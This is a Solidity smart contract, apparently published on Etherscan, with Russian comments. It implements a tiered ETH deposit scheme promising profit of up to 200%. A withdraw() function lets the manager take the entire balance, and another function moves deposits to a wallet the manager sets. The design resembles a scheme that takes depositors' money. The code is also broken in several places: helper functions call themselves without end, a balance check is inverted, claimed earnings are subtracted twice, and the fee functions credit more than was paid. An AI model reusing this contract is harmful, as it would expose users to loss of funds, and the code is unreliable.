/**
 *Submitted for verification at Etherscan.io on 2021-11-14
*/

/**
 *Submitted for verification at Etherscan.io on 2021-11-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.3;

library Math {
    //сложение
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    // проверка переполнения при вычете
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b);
    }
    //Вычитание
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    //2.9
    function dnproc(uint256 a, uint256 b) internal pure returns (uint256) {
        return dnproc(a, b);
    }
    function dnproc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a / 1000 * 29;
        return c;
    }

    //2.1
    function doproc(uint256 a, uint256 b) internal pure returns (uint256) {
        return dnproc(a, b);
    }
    function doproc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a / 1000 * 21;
        return c;
    }

    //3.5
    function dfproc(uint256 a, uint256 b) internal pure returns (uint256) {
        return dnproc(a, b);
    }
    function dfproc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a / 1000 * 35;
        return c;
    }

    //1.8
    function deproc(uint256 a, uint256 b) internal pure returns (uint256) {
        return dnproc(a, b);
    }
    function deproc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a / 1000 * 18;
        return c;
    }


    //5
    function dffproc(uint256 a, uint256 b) internal pure returns (uint256) {
        return dnproc(a, b);
    }
    function dffproc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a / 1000 * 50;
        return c;
    }

    //Умножение
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    //Деление на ноль невозможно
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b);
    }
    //Деление значений
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    //модуль
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b);
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract kontekst {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Our is kontekst {

    address private _owner;

    address public candidate;

    event owneraddress(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit owneraddress(address(0), msgSender);
    }

   //Текущий владелец - адресс
    function owner() public view returns (address) {
        return _owner;
    }

    //модификатор овнер равен адрессу кто устанавливал смарт контракт
    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    // Можно передать новому владельцу
    function changeOwner(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit owneraddress(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Redmond is Our {

    using Math for uint256;

    event UpdateMessage(string oldStr, string newStr);

    string public message;

    address payable public institwallet;

    mapping (address => bool) public hasRedmontRevshare;
    mapping (address => address) public Companydeposit;
    mapping (address => uint256) public Feelicense;
    mapping (address => uint256) public depostime;
    mapping (address => bool) public isDepositor;
    mapping (address => uint256) public amountDeposit;
    mapping (address => uint256) public amountDepositorEarned;
    mapping (uint256 => uint256) public lvprice;
    mapping (address => uint256) public lvdepositor;



    uint256 public totalSupply;
    uint256 public lasttsenteth;
    uint256 public lasttprofit;
    address public leader;
    uint256 public totaldeposited;
    uint256 public currentdeposited;
    uint256 public totalinstitution;
    uint256 public totalsubscription;
    uint256 public totalwithdrawal;
    uint256 public totalredemption;
    uint256 public constant LAST_LEVEL = 12;

    bool private unlocked = true;




    constructor(string memory initMessage) {
        leader = _msgSender();
        lvprice[1] = 0.000000025 ether;
        for (uint256 i = 2; i <= LAST_LEVEL; i++) {
            lvprice[i] = lvprice[i-1] * 2;
        }
        message = initMessage;
    }



    function update(string memory newMessage) public{
        string memory oldMsg = message;
        message = newMessage;
        emit UpdateMessage(oldMsg, newMessage);
     }

    // блокируем токена обмен
    modifier lock() {
        require(unlocked == true, 'TotemSwap: LOCKED');
        unlocked = false;
        _;
        unlocked = true;
    }

    event Deposit(address depositer, uint256 amount, uint256 timestamp); // вывод транзакций

    //только менеджер может вызывать
    modifier onlyManager() {
        require(leader == _msgSender());
        _;
    }



    // Проверка что у менеджера есть адресс
    function setmanager(address _manager) external onlyManager() {
        require(_manager != address(0));
        leader = _manager;
    }
    // Проверка что кошелек имеет адресс
    function InstWallet(address payable _wallet) external onlyManager() {
        require(_wallet != address(0));
        institwallet = _wallet;
    }

    function accountDeposit(uint256 level) public payable {

        require(msg.value == lvprice[level], "invalid price");
        require(level > 0 && level <= LAST_LEVEL, "invalid level number");
        totaldeposited = totaldeposited.add(msg.value);
        currentdeposited = currentdeposited.add(msg.value);
        isDepositor[msg.sender] = true;
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(msg.value);
        depostime[msg.sender] = block.timestamp;
        lvdepositor[msg.sender] = level;


        emit Deposit(msg.sender, msg.value, block.timestamp);
    }

    //Функция повышения уровня
    function upgradeLevel() public payable {
        require(isDepositor[msg.sender]);
        uint256 currentLevel = lvdepositor[msg.sender];
        require(currentLevel + 1 <= LAST_LEVEL, "next level invalid");
        require(msg.value == lvprice[currentLevel + 1], "invalid price");

        totaldeposited = totaldeposited.add(msg.value);
        currentdeposited = currentdeposited.add(msg.value);
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(msg.value);
        depostime[msg.sender] = block.timestamp;
        lvdepositor[msg.sender] = currentLevel + 1;
    }

    //Отправляем деньги на свой кошелек
    function sendInstitution() public onlyManager() {
        require(currentdeposited < 1 ether, "Funds not enought to send to institution.");
        require(address(this).balance >= currentdeposited, "Insufficient balance to send to institution.");
        require(institwallet != address(0), "No institutional wallet set up.");
        institwallet.transfer(currentdeposited);
        totalinstitution = totalinstitution.add(currentdeposited);
        currentdeposited = 0;
        lasttsenteth = block.timestamp;
    }

    //Калькулятор
    function calcreweard(address account) public view returns (uint256, uint256) {
        require(totalinstitution > 0, "No funds have been transferred to the institutional wallet.");
        require(depostime[account] < lasttsenteth && depostime[account] < lasttprofit, "You don't have profit yet.");
        uint256 profit = totalsubscription.mul(amountDeposit[account]).div(totalinstitution);
        profit = profit.add(Feelicense[account]);

        uint256 Revenueshare;
        if (hasRedmontRevshare[account])
        {
            Revenueshare = profit.mul(2).div(10);
            profit = profit.sub(Revenueshare);
        }

        if (profit < amountDepositorEarned[account])
        {
            return (0, 0);
        }
        else
        {
            profit = profit.sub(amountDepositorEarned[account]);
        }

        return (profit, Revenueshare);
    }

    function claim() external lock
    {
        address claimer = msg.sender;  //адресс заявителя
        require(isDepositor[claimer], "You must deposit first to earn profit."); // если депозит вкладчика пуст
        uint256 earnedToDeposit = amountDepositorEarned[claimer].div(amountDeposit[claimer]); // заработано на депозите
        require(earnedToDeposit < 2, "You already have earned 200% of your deposit. Please upgrade your potfolio.");// проверка что уже заработал 200%
        (uint256 profit, uint256 Revenueshare) = calcreweard(claimer); //считаем вознаграждение
        require(profit > 0, "No profit for your account");
        Feelicense[claimer] = 0;
        if (Revenueshare > 0)
        {
            address RedmontRevshare = Companydeposit[claimer];
            Feelicense[RedmontRevshare] = Feelicense[RedmontRevshare].add(Revenueshare);
        }
        profit = profit.sub(amountDepositorEarned[claimer]);
        (bool success, /* bytes memory data */) = payable(claimer).call{value: profit, gas: 30000}("");
        if (success) {
            amountDepositorEarned[claimer] = amountDepositorEarned[claimer].add(profit); // сумма вкладчика  + его профит
        }
    }

    function Licensefee() public payable
    {
        uint256 z = msg.value;
        uint256 t = 29*z/1000;
        uint256 t1 = z + t;

        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(t1);
        emit Deposit(msg.sender, t1, block.timestamp);
    }

    function TechnologyProviderFee() public payable
    {
        uint256 z = msg.value;
        uint256 t = 21*z/1000;
        uint256 t1 = z + t;
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(t1);
        emit Deposit(msg.sender, t1, block.timestamp);
    }

    function TechnologyProviderWithdrawalFee() public payable
    {
        uint256 z = msg.value;
        uint256 t = 35*z/1000;
        uint256 t1 = z + t;
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(t1);
        emit Deposit(msg.sender, t1, block.timestamp);
    }

    function StrategyWithdrawalFee() public payable
    {
        uint256 z = msg.value;
        uint256 t = 18*z/1000;
        uint256 t1 = z + t;
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(t1);
        emit Deposit(msg.sender, t1, block.timestamp);
    }


    function REMOWithdrawalfee() public payable
    {
        uint256 z = msg.value;
        uint256 t = 50*z/1000;
        uint256 t1 = z + t;
        amountDeposit[msg.sender] = amountDeposit[msg.sender].add(t1);
        emit Deposit(msg.sender, t1, block.timestamp);
    }



    function withdraw() external onlyManager {
        payable(leader).transfer(address(this).balance);
    }



    receive() external payable {
        totalsubscription = msg.value;
        lasttprofit = block.timestamp;
    }

}